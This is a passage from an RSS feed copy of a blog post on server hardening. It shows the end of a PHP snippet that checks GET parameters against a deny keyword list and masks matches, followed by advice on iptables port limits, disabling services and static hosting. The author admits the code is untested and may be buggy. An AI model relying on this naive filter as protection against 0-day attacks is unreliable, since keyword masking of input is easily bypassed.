style="color: #DD0000">"ZZZZ4"</span><span style="color: #007700">,</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_POST</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">'msn'</span><span style="color: #007700">&#93;);<br /><br />foreach(</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">as&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&gt;&nbsp;</span><span style="color: #0000BB">$value</span><span style="color: #007700">){<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$key&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$key</span><span style="color: #007700">);<br />&nbsp;&nbsp;</span><span style="color: #0000BB">$value&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">strtolower</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">);<br />&nbsp;&nbsp;for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$value</span><span style="color: #007700">,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">$post&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_GET&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">);<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />}<br /></span><span style="color: #FF8000">//</span><span style="color: #0000BB">?&gt;</span>&nbsp;if&nbsp;you&nbsp;want&nbsp;add&nbsp;it&nbsp;on&nbsp;vbulletin&nbsp;you&nbsp;shouldn't&nbsp;close&nbsp;it&nbsp;with&nbsp;?&gt;</span>
</code></code></div>
</div>Note: These codes didn’t test with professional methods and it might be full of bugs, So you have to be able to develop these codes before use.<br />
<br />
And last thing about other services same cpanel,ssh and … , you must set IP limits with iptables for all of their ports number OR stop their services if you don’t need these, if you want to stop services don’t forgot for start them again you need CONSOLE ACCESS and if you don’t have console access , don’t disable them. disabling services protect you from 0Day Vulnerabilities that they are not public yet.<br />
<br />
until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for DOS/DDOS and deface or uploading. We didn’t config any IDS or IPS professional mode But be sure with doing these on your server be sure you protected so much.<br />
<br />
But at last if you are same me and very stressful , get a domain , install octopress blogging on your system and upload your site on<a href="http://pages.github.com/" target="_blank"> github pages</a>, or use <a href="http://blogger.com/" target="_blank">blogger.com</a>.<br />
<br />
<font size="3"><b> References</b></font><br />
<br />
1- Sites that I shared URLs<br />
2- Bash Code on <a href="http://google.com/" target="_blank">Google</a><br />
3- <a href="http://z3r0d4y.com/" target="_blank">ZCR ZeroDay Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3127</guid>
		</item>
	</channel>
</rss>
